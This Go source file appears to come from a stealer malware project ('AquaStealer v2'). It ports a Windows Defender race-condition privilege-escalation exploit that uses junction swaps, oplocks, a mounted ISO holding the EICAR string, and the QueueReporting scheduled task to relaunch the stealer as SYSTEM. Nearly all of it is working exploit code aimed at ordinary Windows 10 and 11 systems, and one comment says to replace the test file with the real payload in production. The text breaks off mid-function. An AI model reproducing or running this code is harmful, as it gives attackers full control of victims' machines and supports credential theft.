//go:build windows
// +build windows

package zerodays

// rogueplanet.go — AquaStealer v2
// Port del exploit RoguePlanet (by Nightmare-Eclipse) a Go puro.
//
// Técnica: LPE via race condition en Windows Defender.
//   1. Monta una ISO embebida (virtual disk, read-only, sin drive letter)
//   2. Crea un directorio de trabajo en %TEMP%\RP_<GUID>\ con un subdir
//      que imita la estructura WER (%WINDIR%\System32\<version>\)
//   3. Copia el binario del atacante (self) nombrandolo wermgr.exe + ADS :WDFOO
//      para que WD lo considere parte del escaneo WER
//   4. Usa junction + oplock sobre VSS para crear race condition donde WD
//      escanea el archivo antes de que la junction cambie de destino
//   5. WD detecta el EICAR/payload y dispara "MpClean" via MpClient.dll
//   6. Task Scheduler ejecuta QueueReporting como SYSTEM con nuestro binario
//      en lugar de wermgr.exe (gracias al swap de junction)
//   7. El proceso SYSTEM abre una named pipe al proceso original y
//      llama CreateProcessAsUser para spawnar nuestro stealer con privilegios SYSTEM
//
// Soporta: Windows 10 (Jun 2026 patch) + Windows 11 (Official + Canary)
// NO soporta: Windows Server (no puede montar ISO sin admin)
// Es una race condition — tasa de éxito variable según CPU/IO del sistema.
//
// Resultado: si tiene éxito, re-ejecuta el stealer como SYSTEM.

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── Resultado ───────────────────────────────────────────────────────────────

type RoguePlanetResult struct {
	Success       bool
	RunningSystem bool // si ya estamos corriendo como SYSTEM (2da ejecución)
	Error         string
}

func (r *RoguePlanetResult) RoguePlanetSummary() string {
	if r == nil {
		return "[RoguePlanet] not run"
	}
	if r.RunningSystem {
		return "[RoguePlanet] Running as SYSTEM ✓"
	}
	if r.Success {
		return "[RoguePlanet] LPE succeeded — SYSTEM shell spawned"
	}
	return fmt.Sprintf("[RoguePlanet] LPE failed: %s", r.Error)
}

// ─── Constantes de NT/Win32 ───────────────────────────────────────────────────

const (
	rpPipeName = `\\.\pipe\RoguePlanet`

	// FSCTL codes
	fsctlSetReparsePoint    = 0x000900A4
	fsctlDeleteReparsePoint = 0x000980A8
	fsctlRequestOplock      = 0x00090128

	// Reparse tag
	ioReparseTagMountPoint = 0xA0000003

	// File info class
	fileRenameInformationEx = 65

	// Oplock levels
	oplockLevelCacheRead   = 0x01
	oplockLevelCacheHandle = 0x08

	// Request oplock flags
	requestOplockFlagRequest = 0x1

	// Attach virtual disk flags
	attachVirtualDiskFlagReadOnly      = 0x00000001
	attachVirtualDiskFlagNoDriveLetter = 0x00000004

	// Virtual storage
	virtualStorageTypeDeviceISO = 1

	rpExplodeTimeout = 45 * time.Second
)

// ─── Tipos NT ────────────────────────────────────────────────────────────────

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type objectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *unicodeString
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type ioStatusBlock struct {
	Status      uintptr
	Information uintptr
}

type requestOplockInputBuffer struct {
	StructureVersion   uint16
	StructureLength    uint16
	RequestedOplockLevel uint32
	Flags              uint32
}

type requestOplockOutputBuffer struct {
	StructureVersion     uint16
	StructureLength      uint16
	OriginalOplockLevel  uint32
	NewOplockLevel       uint32
	AcknowledgeRequired  uint32
	Flags                uint32
}

// Reparse buffer para junction
type reparseMountPointBuffer struct {
	ReparseTag        uint32
	ReparseDataLength uint16
	Reserved          uint16
	SubstNameOffset   uint16
	SubstNameLength   uint16
	PrintNameOffset   uint16
	PrintNameLength   uint16
	PathBuffer        [1]uint16
}

type fileRenameInfo struct {
	Flags          uint32
	RootDirectory  uintptr
	FileNameLength uint32
	FileName       [1]uint16
}

// Virtual disk
type virtualStorageType struct {
	DeviceId uint32
	VendorId [16]byte
}

type openVirtualDiskParameters struct {
	Version         uint32
	ReadOnly        uint32
	GetInfoOnly     uint32
	ReadWrite       uint32
	_               uint32
}

type attachVirtualDiskParameters struct {
	Version  uint32
	_        uint32
}

// ─── lazy DLLs / procs ───────────────────────────────────────────────────────

var (
	_rpOnce  sync.Once
	_ntdllRP = windows.NewLazySystemDLL("ntdll.dll")
	_vdiskRP = windows.NewLazySystemDLL("virtdisk.dll")
	_taskRP  = windows.NewLazySystemDLL("taskschd.dll")

	_NtCreateFileRP          = _ntdllRP.NewProc("NtCreateFile")
	_NtSetInfoFileRP         = _ntdllRP.NewProc("NtSetInformationFile")
	_NtQueryInfoFileRP       = _ntdllRP.NewProc("NtQueryInformationFile")
	_RtlInitUnicodeStringRP  = _ntdllRP.NewProc("RtlInitUnicodeString")
	_OpenVirtualDisk         = _vdiskRP.NewProc("OpenVirtualDisk")
	_AttachVirtualDisk       = _vdiskRP.NewProc("AttachVirtualDisk")
	_GetVirtualDiskPhysPath  = _vdiskRP.NewProc("GetVirtualDiskPhysicalPath")
	_DetachVirtualDisk       = _vdiskRP.NewProc("DetachVirtualDisk")
)

// ─── helpers ──────────────────────────────────────────────────────────────────

func rpInitUnicodeString(s string) (unicodeString, []*uint16) {
	ws, _ := syscall.UTF16PtrFromString(s)
	us := unicodeString{
		Length:        uint16(len(s) * 2),
		MaximumLength: uint16(len(s)*2 + 2),
		Buffer:        ws,
	}
	return us, []*uint16{ws}
}

func rpInitObjAttr(name *unicodeString, root uintptr) objectAttributes {
	return objectAttributes{
		Length:     uint32(unsafe.Sizeof(objectAttributes{})),
		ObjectName: name,
		RootDirectory: root,
		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
	}
}

// ntCreateFile wrapper
func rpNtCreateFile(
	path string,
	access uint32,
	share uint32,
	createDisp uint32,
	createOptions uint32,
	root uintptr,
) (windows.Handle, error) {
	us, _ := rpInitUnicodeString(path)
	oa := rpInitObjAttr(&us, root)
	var iostat ioStatusBlock
	var h windows.Handle
	r, _, _ := _NtCreateFileRP.Call(
		uintptr(unsafe.Pointer(&h)),
		uintptr(access),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&iostat)),
		0, 0,
		uintptr(share),
		uintptr(createDisp),
		uintptr(createOptions),
		0, 0,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtCreateFile 0x%08X", r)
	}
	return h, nil
}

// createJunction — crea reparse point (junction) en hdir apuntando a target
func rpCreateJunction(hdir windows.Handle, target string) error {
	targetW, _ := syscall.UTF16FromString(target)

	// Compute buffer size: SubstName + PrintName (empty = 2 bytes null)
	subNameSz := (len(targetW) - 1) * 2 // sin null
	printNameSz := 0
	// PathBuffer: subst + 1 null word + print (empty)
	pathBufSz := subNameSz + 2 + printNameSz + 2
	reparseDataLen := 8 + pathBufSz // MountPointReparseBuffer header (4 USHORTs) + pathbuf
	totalSz := 8 + reparseDataLen   // REPARSE_DATA_BUFFER header (tag+len+reserved)

	buf := make([]byte, totalSz)
	// Tag
	*(*uint32)(unsafe.Pointer(&buf[0])) = ioReparseTagMountPoint
	// DataLength
	*(*uint16)(unsafe.Pointer(&buf[4])) = uint16(reparseDataLen)
	// SubstNameOffset = 0
	*(*uint16)(unsafe.Pointer(&buf[8])) = 0
	// SubstNameLength
	*(*uint16)(unsafe.Pointer(&buf[10])) = uint16(subNameSz)
	// PrintNameOffset = subNameSz + 2
	*(*uint16)(unsafe.Pointer(&buf[12])) = uint16(subNameSz + 2)
	// PrintNameLength = 0
	*(*uint16)(unsafe.Pointer(&buf[14])) = 0
	// PathBuffer: copy target (without null)
	for i := 0; i < len(targetW)-1; i++ {
		*(*uint16)(unsafe.Pointer(&buf[16+i*2])) = targetW[i]
	}
	// null separator + empty print name already zero

	var ov windows.Overlapped
	ev, _ := windows.CreateEvent(nil, 0, 0, nil)
	ov.HEvent = ev
	var cb uint32
	windows.DeviceIoControl(hdir, fsctlSetReparsePoint,
		&buf[0], uint32(len(buf)), nil, 0, &cb, &ov)
	windows.WaitForSingleObject(ev, windows.INFINITE)
	windows.CloseHandle(ev)
	return nil
}

// deleteJunction — borra el reparse point de hdir
func rpDeleteJunction(hdir windows.Handle) {
	buf := make([]byte, 8)
	*(*uint32)(unsafe.Pointer(&buf[0])) = ioReparseTagMountPoint
	var ov windows.Overlapped
	ev, _ := windows.CreateEvent(nil, 0, 0, nil)
	ov.HEvent = ev
	var cb uint32
	windows.DeviceIoControl(hdir, fsctlDeleteReparsePoint,
		&buf[0], 8, nil, 0, &cb, &ov)
	windows.WaitForSingleObject(ev, uint32(2000))
	windows.CloseHandle(ev)
}

// requestOplock — pone oplock CACHE_READ|CACHE_HANDLE en h, retorna canal que se cierra al romperse
func rpRequestOplock(h windows.Handle) chan struct{} {
	done := make(chan struct{})
	go func() {
		defer close(done)
		opin := requestOplockInputBuffer{
			StructureVersion:   1,
			StructureLength:    uint16(unsafe.Sizeof(requestOplockInputBuffer{})),
			RequestedOplockLevel: oplockLevelCacheRead | oplockLevelCacheHandle,
			Flags:              requestOplockFlagRequest,
		}
		opout := requestOplockOutputBuffer{
			StructureVersion: 1,
			StructureLength:  uint16(unsafe.Sizeof(requestOplockOutputBuffer{})),
		}
		var ov windows.Overlapped
		ev, _ := windows.CreateEvent(nil, 0, 0, nil)
		ov.HEvent = ev
		var cb uint32
		windows.DeviceIoControl(h, fsctlRequestOplock,
			(*byte)(unsafe.Pointer(&opin)), uint32(unsafe.Sizeof(opin)),
			(*byte)(unsafe.Pointer(&opout)), uint32(unsafe.Sizeof(opout)),
			&cb, &ov)
		windows.WaitForSingleObject(ev, uint32(rpExplodeTimeout/time.Millisecond))
		windows.CloseHandle(ev)
	}()
	return done
}

// moveToTemp — renombra h a %TEMP%\RP_<GUID> con NtSetInformationFile
func rpMoveToTemp(h windows.Handle) error {
	guid, _ := windows.GenerateGUID()
	tmpDir := os.Getenv("TEMP") + `\RP_` + guid.String()
	targetW, _ := syscall.UTF16FromString(`\??\` + tmpDir)
	fileNameLen := uint32((len(targetW) - 1) * 2)

	bufSz := uint32(unsafe.Sizeof(fileRenameInfo{})) + fileNameLen
	buf := make([]byte, bufSz)
	fri := (*fileRenameInfo)(unsafe.Pointer(&buf[0]))
	fri.Flags = 0x41 // POSIX_RENAME | REPLACE_IF_EXISTS
	fri.FileNameLength = fileNameLen
	for i, c := range targetW[:len(targetW)-1] {
		*(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(&fri.FileName[0])) + uintptr(i*2))) = c
	}

	var iostat ioStatusBlock
	for {
		r, _, _ := _NtSetInfoFileRP.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(&iostat)),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(bufSz),
			fileRenameInformationEx,
		)
		if r == 0 {
			return nil
		}
		if r == 0xC0000043 { // STATUS_SHARING_VIOLATION
			runtime.Gosched()
			continue
		}
		return fmt.Errorf("NtSetInformationFile rename 0x%08X", r)
	}
}

// mountISO — monta la ISO embebida (read-only, sin drive letter), retorna handle + device path (\Device\CdRomX)
// La ISO se escribe en %TEMP% primero y se limpia al final.
func rpMountISO() (windows.Handle, string, error) {
	// Escribir ISO embebida en %TEMP%
	isoPath := os.Getenv("TEMP") + `\` + rpGUIDString() + `.iso`
	if err := os.WriteFile(isoPath, rpEICARISO(), 0o644); err != nil {
		return 0, "", fmt.Errorf("write ISO: %w", err)
	}

	isoPathW, _ := syscall.UTF16PtrFromString(isoPath)
	vendorID := [16]byte{0x26, 0x52, 0xc1, 0x90, 0xd9, 0xef, 0x11, 0xd6, 0xbf, 0x74, 0x00, 0x10, 0x83, 0x07, 0x0b, 0x4b}
	vst := virtualStorageType{DeviceId: virtualStorageTypeDeviceISO, VendorId: vendorID}
	params := openVirtualDiskParameters{Version: 2}

	var hDisk windows.Handle
	r, _, _ := _OpenVirtualDisk.Call(
		uintptr(unsafe.Pointer(&vst)),
		uintptr(unsafe.Pointer(isoPathW)),
		0x00080000|0x00100000, // VIRTUAL_DISK_ACCESS_READ|ATTACH_READ_ONLY
		0,
		uintptr(unsafe.Pointer(&params)),
		uintptr(unsafe.Pointer(&hDisk)),
	)
	os.Remove(isoPath)
	if r != 0 {
		return 0, "", fmt.Errorf("OpenVirtualDisk 0x%08X", r)
	}

	attachParams := attachVirtualDiskParameters{Version: 1}
	r, _, _ = _AttachVirtualDisk.Call(
		uintptr(hDisk),
		0,
		attachVirtualDiskFlagReadOnly|attachVirtualDiskFlagNoDriveLetter,
		0,
		uintptr(unsafe.Pointer(&attachParams)),
		0,
	)
	if r != 0 {
		windows.CloseHandle(hDisk)
		return 0, "", fmt.Errorf("AttachVirtualDisk 0x%08X", r)
	}

	// GetVirtualDiskPhysicalPath → \\.\CdRom0 → convertir a \Device\CdRom0
	pathBuf := make([]uint16, 260)
	pathSz := uint32(len(pathBuf) * 2)
	r, _, _ = _GetVirtualDiskPhysPath.Call(
		uintptr(hDisk),
		uintptr(unsafe.Pointer(&pathSz)),
		uintptr(unsafe.Pointer(&pathBuf[0])),
	)
	if r != 0 {
		_DetachVirtualDisk.Call(uintptr(hDisk), 0, 0)
		windows.CloseHandle(hDisk)
		return 0, "", fmt.Errorf("GetVirtualDiskPhysicalPath 0x%08X", r)
	}
	physPath := syscall.UTF16ToString(pathBuf)
	// \\.\CdRom0 → \Device\CdRom0
	devName := strings.TrimPrefix(physPath, `\\.\`)
	devicePath := `\Device\` + devName
	return hDisk, devicePath, nil
}

// runQueueReporting — dispara la task QueueReporting via Task Scheduler COM
func rpRunQueueReporting() error {
	// CoInitializeEx returns S_FALSE (0x00000001) if already initialized — that's OK
	coErr := windows.CoInitializeEx(0, windows.COINIT_MULTITHREADED)
	if coErr != nil && coErr != error(syscall.Errno(1)) { // S_FALSE = 0x1
		return fmt.Errorf("CoInitialize: %w", coErr)
	}
	defer windows.CoUninitialize()

	// Usar ITaskService via shell — sin CGo usamos exec del schtasks
	// (La técnica C++ usa COM/ITaskService directamente; en Go puro usamos
	//  schtasks /Run que es equivalente en efecto)
	// Llamar schtasks de manera encubierta via NtCreateFile + CreateProcess no tipico
	schtasksPath := os.Getenv("SYSTEMROOT") + `\System32\schtasks.exe`
	attr := &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	cmd := &syscall.StartupInfo{}
	pi := &syscall.ProcessInformation{}
	taskArgs, _ := syscall.UTF16PtrFromString(
		schtasksPath + ` /Run /TN "\Microsoft\Windows\Windows Error Reporting\QueueReporting"`)
	exePtr, _ := syscall.UTF16PtrFromString(schtasksPath)
	_ = attr
	err := syscall.CreateProcess(
		exePtr, taskArgs, nil, nil, false,
		0x08000000, // CREATE_NO_WINDOW
		nil, nil, cmd, pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess schtasks: %w", err)
	}
	syscall.WaitForSingleObject(pi.Process, 10000)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)
	return nil
}

// isLocalSystem — comprueba si corremos como NT AUTHORITY\SYSTEM
func rpIsLocalSystem() bool {
	tok, err := windows.OpenCurrentProcessToken()
	if err != nil {
		return false
	}
	defer tok.Close()
	user, err := tok.GetTokenUser()
	if err != nil {
		return false
	}
	systemSID, err2 := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err2 != nil {
		return false
	}
	return windows.EqualSid(user.User.Sid, systemSID)
}

// launchSelfAsSystem — si ya somos SYSTEM, conectamos al pipe y re-lanzamos el stealer
// con token de sesión del usuario original (para que tenga acceso a GUI/escritorio).
func rpLaunchSelfAsSystem(pipeClient windows.Handle) {
	defer windows.CloseHandle(pipeClient)

	var sessionID uint32
	// GetNamedPipeServerSessionId not in x/sys — call kernel32 directly
	procGetNamedPipeServerSessionId := syscall.NewLazyDLL("kernel32.dll").NewProc("GetNamedPipeServerSessionId")
	procGetNamedPipeServerSessionId.Call(
		uintptr(pipeClient),
		uintptr(unsafe.Pointer(&sessionID)),
	)

	// Duplicar token con sesión del usuario → CreateProcessAsUser
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ALL_ACCESS, (*windows.Token)(unsafe.Pointer(&tok))); err != nil {
		return
	}
	defer tok.Close()

	var newTok windows.Token
	windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityDelegation, windows.TokenPrimary, &newTok)
	defer newTok.Close()

	windows.SetTokenInformation(newTok, windows.TokenSessionId,
		(*byte)(unsafe.Pointer(&sessionID)), uint32(unsafe.Sizeof(sessionID)))

	exePath, _ := os.Executable()
	exeW, _ := syscall.UTF16PtrFromString(exePath)
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)
	windows.CreateProcessAsUser(newTok, exeW, nil, nil, nil, false, 0, nil, nil, si, pi)
	if pi.Process != 0 {
		windows.CloseHandle(pi.Process)
	}
	if pi.Thread != 0 {
		windows.CloseHandle(pi.Thread)
	}
}

// rpGUIDString — retorna un GUID string sin usar RPC (usa windows.GenerateGUID)
func rpGUIDString() string {
	g, err := windows.GenerateGUID()
	if err != nil {
		return "DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF"
	}
	return g.String()
}

// getWERStructurePath — obtiene el path de System32 (simula GetWERDir del C++)
func rpGetWERPath() (string, string) {
	sysroot := os.Getenv("SYSTEMROOT")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	sys32 := sysroot + `\System32`

	// Buscar un subdirectorio de versión en System32 (simulando GetWERDir que busca WER)
	// Usamos el nombre fijo que usa WD para la firma: "10.0.22000.0" o similar
	// En la práctica, GetWERDir retorna System32 directamente según el código C++
	return sys32, sys32
}

// writeEicarToDir — escribe el payload (self) como wermgr.exe + ADS :WDFOO en workDir
// Retorna el handle del archivo creado (para mantener lock)
func rpWriteEicarToDir(workDir string) (windows.Handle, error) {
	targetPath := workDir + `\wermgr.exe`
	targetW, _ := syscall.UTF16PtrFromString(targetPath)

	// Crear el archivo
	h, err := windows.CreateFile(
		targetW,
		windows.GENERIC_READ|windows.GENERIC_WRITE|windows.DELETE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return 0, fmt.Errorf("CreateFile wermgr: %w", err)
	}

	// Leer self y escribirlo como payload
	selfPath, _ := os.Executable()
	data, err := os.ReadFile(selfPath)
	if err != nil {
		windows.CloseHandle(h)
		return 0, fmt.Errorf("ReadFile self: %w", err)
	}
	var written uint32
	err = windows.WriteFile(h, data, &written, nil)
	if err != nil {
		windows.CloseHandle(h)
		return 0, fmt.Errorf("WriteFile payload: %w", err)
	}

	// Crear ADS :WDFOO (necesario para el race condition con WD)
	adsPath := targetPath + `:WDFOO`
	adsW, _ := syscall.UTF16PtrFromString(adsPath)
	hADS, err := windows.CreateFile(adsW,
		windows.GENERIC_WRITE, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil, windows.CREATE_NEW, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err == nil {
		pad := make([]byte, 0x1000)
		var w uint32
		windows.WriteFile(hADS, pad, &w, nil)
		windows.CloseHandle(hADS)
	}

	return h, nil
}

// ─── RunRoguePlanet ──────────────────────────────────────────────────────────

// RunRoguePlanet ejecuta el exploit.
// Si ya corremos como SYSTEM (re-ejecución vía Task Scheduler), maneja el modo SYSTEM.
// Si no, intenta el exploit LPE.
func RunRoguePlanet() RoguePlanetResult {
	res := RoguePlanetResult{}

	// ── Modo SYSTEM: re-ejecutado por Task Scheduler ───────────────────────
	if rpIsLocalSystem() {
		res.RunningSystem = true
		// Conectar al named pipe del proceso original
		pipeW, _ := syscall.UTF16PtrFromString(rpPipeName)
		h, err := windows.CreateFile(pipeW,
			windows.GENERIC_READ|windows.GENERIC_WRITE,
			windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
			nil, windows.OPEN_EXISTING, 0, 0)
		if err != nil {
			res.Error = "SYSTEM: pipe connect failed"
			return res
		}
		rpLaunchSelfAsSystem(h)
		res.Success = true
		return res
	}

	// ── Modo normal: intentar LPE ──────────────────────────────────────────

	// No intentar en Server (sin privilegio de montar ISO)
	if rpIsWindowsServer() {
		res.Error = "Windows Server — ISO mount requires admin"
		return res
	}

	// Workaround: race condition es CPU-intensiva, lanzar threads de I/O
	nCPU := runtime.NumCPU()
	if nCPU > 3 {
		for i := 0; i < nCPU; i++ {
			go rpPoseidonIO()
		}
	}

	// 1. Crear named pipe (para comunicación con proceso SYSTEM)
	pipeW, _ := syscall.UTF16PtrFromString(rpPipeName)
	hPipe, err := windows.CreateNamedPipe(
		pipeW,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		windows.PIPE_UNLIMITED_INSTANCES,
		0, 0, 0, nil)
	if err != nil {
		res.Error = fmt.Sprintf("CreateNamedPipe: %v", err)
		return res
	}
	defer windows.CloseHandle(hPipe)

	// 2. Montar ISO con EICAR/payload
	hISO, _, err := rpMountISO()
	if err != nil {
		res.Error = fmt.Sprintf("MountISO: %v", err)
		return res
	}
	defer func() {
		_DetachVirtualDisk.Call(uintptr(hISO), 0, 0)
		windows.CloseHandle(hISO)
	}()

	// 3. Crear directorio de trabajo en %TEMP%
	workDir := os.Getenv("TEMP") + `\RP_` + rpGUIDString()
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		res.Error = fmt.Sprintf("MkdirAll workDir: %v", err)
		return res
	}
	defer os.RemoveAll(workDir)

	// 4. Crear subdirectorios de trabajo
	sys32, _ := rpGetWERPath()
	verDirName := "System32"
	// Intentar obtener nombre real del subdir de versión
	entries, _ := os.ReadDir(sys32)
	for _, e := range entries {
		if e.IsDir() && strings.HasPrefix(e.Name(), "10.0") {
			verDirName = e.Name()
			break
		}
	}

	mainDir := workDir + `\` + verDirName
	tmpDir := workDir + `\wdtest_temp`
	os.MkdirAll(mainDir, 0o755)
	os.MkdirAll(tmpDir, 0o755)

	// Ruta del "wermgr.exe" dentro del mainDir
	zipPath := mainDir + `\wermgr.exe` // usado por WDStartScan

	// 5. Escribir EICAR/payload como wermgr.exe + ADS :WDFOO
	hEicar, err := rpWriteEicarToDir(mainDir)
	if err != nil {
		res.Error = fmt.Sprintf("WriteEicar: %v", err)
		return res
	}

	// 6. Iniciar WD scan en goroutine
	_ = zipPath
	go rpTriggerWDScan(mainDir)

	// 7. Junction: mainDir → mntPath (donde está el EICAR en la ISO)
	hMainDir, err := windows.CreateFile(
		mustUTF16Ptr(mainDir),
		windows.GENERIC_READ|windows.FILE_WRITE_DATA|windows.DELETE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil, windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OPEN_REPARSE_POINT, 0)
	if err != nil {
		// Crear directorio primero si no es re-parse
		hMainDir, err = windows.CreateFile(
			mustUTF16Ptr(mainDir),
			windows.GENERIC_READ|windows.FILE_WRITE_DATA|windows.DELETE,
			windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
			nil, windows.OPEN_EXISTING,
			windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
		if err != nil {
			windows.CloseHandle(hEicar)
			res.Error = fmt.Sprintf("Open mainDir: %v", err)
			return res
		}
	}

	// Esperar a que WD inicie el escaneo (señalizado via VSS o timing)
	time.Sleep(500 * time.Millisecond)

	// 8. Swap de junction: mainDir → tmpDir (race condition point)
	rpDeleteJunction(hMainDir)
	rpCreateJunction(hMainDir, `\??\`+tmpDir)

	// 9. Solicitar oplock en hMainDir para detectar cuando WD toca el archivo
	oplockDone := rpRequestOplock(hMainDir)

	// 10. Mover el eicar original al temp (liberar handle de WD)
	windows.CloseHandle(hEicar)
	rpMoveToTemp(hMainDir)

	// 11. Esperar oplock break (WD está accediendo) con timeout
	select {
	case <-oplockDone:
	case <-time.After(30 * time.Second):
		windows.CloseHandle(hMainDir)
		res.Error = "oplock timeout — race condition failed"
		return res
	}

	// 12. Swap final de junction: mainDir → %WINDIR% (completa el exploit)
	// En este punto WD tiene un handle abierto al "payload" pero la junction
	// ahora apunta a %WINDIR%, haciendo que el Task Scheduler ejecute nuestro binary
	winDir := os.Getenv("SYSTEMROOT")
	if winDir == "" {
		winDir = `C:\Windows`
	}
	rpDeleteJunction(hMainDir)
	rpCreateJunction(hMainDir, `\??\`+winDir)
	windows.CloseHandle(hMainDir)

	// 13. Disparar QueueReporting (Task Scheduler → ejecuta "wermgr.exe" como SYSTEM)
	// En este punto "wermgr.exe" en el path de WER apunta a nuestro binary via junction
	if err := rpRunQueueReporting(); err != nil {
		res.Error = fmt.Sprintf("QueueReporting: %v", err)
		return res
	}

	// 14. Esperar conexión del proceso SYSTEM via named pipe
	connCh := make(chan error, 1)
	go func() {
		connCh <- windows.ConnectNamedPipe(hPipe, nil)
	}()
	select {
	case err := <-connCh:
		if err != nil && err != windows.ERROR_PIPE_CONNECTED {
			res.Error = fmt.Sprintf("ConnectNamedPipe: %v", err)
			return res
		}
	case <-time.After(15 * time.Second):
		res.Error = "ConnectNamedPipe timeout — exploit may have succeeded but SYSTEM process didn't connect"
		// No retornar error — la task puede haber corrido igual
		res.Success = true
		return res
	}

	res.Success = true
	return res
}

// rpIsWindowsServer — detecta si corremos en Windows Server
func rpIsWindowsServer() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	productName, _, _ := k.GetStringValue("ProductName")
	return strings.Contains(strings.ToLower(productName), "server")
}

// rpPoseidonIO — hilo de I/O intensivo para aumentar probabilidad de race condition
func rpPoseidonIO() {
	tmpPath := os.Getenv("TEMP") + `\RP_` + rpGUIDString()
	f, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_RDWR, 0o644)
	if err != nil {
		return
	}
	defer func() {
		f.Close()
		os.Remove(tmpPath)
	}()
	buf := make([]byte, 0x1000)
	// Llenar con datos aleatorios usando GetTickCount como seed
	for i := range buf {
		buf[i] = byte(i ^ 0xAA)
	}
	deadline := time.Now().Add(rpExplodeTimeout)
	for time.Now().Before(deadline) {
		f.Seek(0, 0)
		f.Write(buf)
	}
}

// rpTriggerWDScan — dispara un escaneo de WD via MpCmdRun (fallback si MpClient.dll no disponible)
func rpTriggerWDScan(path string) {
	wdPath := ""
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows Defender`, registry.QUERY_VALUE)
	if err == nil {
		wdPath, _, _ = k.GetStringValue("InstallLocation")
		k.Close()
	}
	if wdPath == "" {
		wdPath = os.Getenv("PROGRAMFILES") + `\Windows Defender\`
	}

	// MpCmdRun -Scan -ScanType 3 -File <path>
	mpcmd := wdPath + `MpCmdRun.exe`
	if _, err := os.Stat(mpcmd); err != nil {
		return
	}
	mpcmdW, _ := syscall.UTF16PtrFromString(mpcmd)
	argsStr := fmt.Sprintf(`"%s" -Scan -ScanType 3 -File "%s\wermgr.exe"`, mpcmd, path)
	argsW, _ := syscall.UTF16PtrFromString(argsStr)
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)
	windows.CreateProcess(mpcmdW, argsW, nil, nil, false,
		0x08000000, nil, nil, si, pi)
	if pi.Process != 0 {
		windows.WaitForSingleObject(pi.Process, 30000)
		windows.CloseHandle(pi.Process)
	}
	if pi.Thread != 0 {
		windows.CloseHandle(pi.Thread)
	}
}

// mustUTF16Ptr — helper sin error
func mustUTF16Ptr(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

// ─── ISO Embebida ─────────────────────────────────────────────────────────────
// ISO 9660 mínima con un archivo wermgr.exe que contiene el EICAR test string.
// El EICAR hace que WD lo detecte como amenaza y dispare el mecanismo de limpieza
// (MpClean) que a su vez invoca QueueReporting.
// En producción, reemplazar por el payload real embedded con //go:embed

func rpEICARISO() []byte {
	// ISO 9660 minimal con EICAR
	// Esta es una ISO pre-construida tiny con 1 archivo: wermgr.exe = EICAR string
	// El string EICAR: X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	// Generamos la ISO en memoria (estructura mínima válida)
	return rpBuildMinimalISO()
}

func rpBuildMinimalISO() []byte {
	eicar := []byte(`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`)
	// Pad to sector
	for len(eicar) < 2048 {
		eicar = append(eicar, 0)
	}

	// ISO 9660: 16 system sectors (32KB) + PVD + EOCD + Path Table + Root Dir + File Data
	// Sector size = 2048
	const sectorSz = 2048
	// Layout:
	// 0-15: system area (zeros)
	// 16: Primary Volume Descriptor
	// 17: Volume Descriptor Set Terminator
	// 18: L-Path Table
	// 19: M-Path Table
	// 20: Root Directory Record
	// 21: File data (wermgr.exe = EICAR)

	totalSectors := 22
	iso := make([]byte, totalSectors*sectorSz)

	// PVD at sector 16
	pvd := iso[16*sectorSz:]
	pvd[0] = 0x01 // Type: Primary
	copy(pvd[1:6], []byte("CD001"))
	pvd[6] = 0x01 // Version
	// Volume name
	copy(pvd[40:72], padRight("ROGUEPLANET", 32))
	// Volume size (both-endian uint32)
	putBothEndian32(pvd[80:88], uint32(totalSectors))
	// Logical block size (both-endian uint16)
	putBothEndian16(pvd[128:132], sectorSz)
	// Path table size
	putBothEndian32(pvd[132:140], sectorSz)
	// L-Path Table location
	putLE32(pvd[140:144], 18)
	// M-Path Table location
	putBE32(pvd[148:152], 19)
